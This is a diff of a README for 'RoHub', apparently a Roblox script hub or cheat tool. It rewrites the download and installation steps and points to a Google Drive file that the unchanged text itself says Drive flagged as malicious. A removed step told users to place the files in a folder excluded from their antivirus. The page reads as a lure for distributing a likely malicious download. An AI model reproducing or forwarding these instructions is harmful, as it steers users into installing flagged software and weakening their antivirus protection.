@@ -18,20 +18,33 @@ unlike Roblox Filtering Disabled, when i tried uploading the zip to google drive
 it got flagged as malicious and blocked sharing the zip file to others, 
 it did not happen when i tried to upload RBLXHub (RoHub) to drive 
 
-## Downloading Instructions
+# Installation Guide
 
-**Prerequisites**
-Ensure you have an archive tool installed:
-* **7-Zip** (64-bit or 32-bit/x86)
-* **WinRAR**
-*(Windows 11 users can use the built-in zip viewer if preferred)*
+Follow these steps to download and set up the project.
 
-**Steps**
-1. Download the file [Link]
-2. Wait for the download to finish
-3. Open the zip file
-4. Drag the **RoHub** folder into the folder you previously excluded in your antivirus
-5. When extraction finishes, you may proceed to the second step
+---
+
+### 1. Prerequisites
+Ensure you have a file archiver installed to extract the project files. 
+
+* **7-Zip:** [Download 64-bit](https://www.7-zip.org/a/7z2501-x64.exe) | [Download 32-bit/x86](https://www.7-zip.org/a/7z2501.exe)
+* **WinRAR:** [Official Download](https://www.win-rar.com/postdownload.html)
+
+Note: If you are using Windows 11, you may use the built-in zip viewer, though installing 7-zip or WinRAR is optional but recommended.
+
+---
+
+### 2. Download the Files
+Click the link below to download the required package:
+
+[**Download Project Files**](https://drive.usercontent.google.com/download?id=1ZY14NRzstnyy-yRMfYBz9nq4tkEM6GL4&export=download)
+
+---
+
+### 3. Extraction
+1. Locate the downloaded file on your computer.
+2. Right-click the file and select "Extract" using your preferred software.
+3. Open the extracted folder to begin.
 
 ## Hosting Your Own Game
 
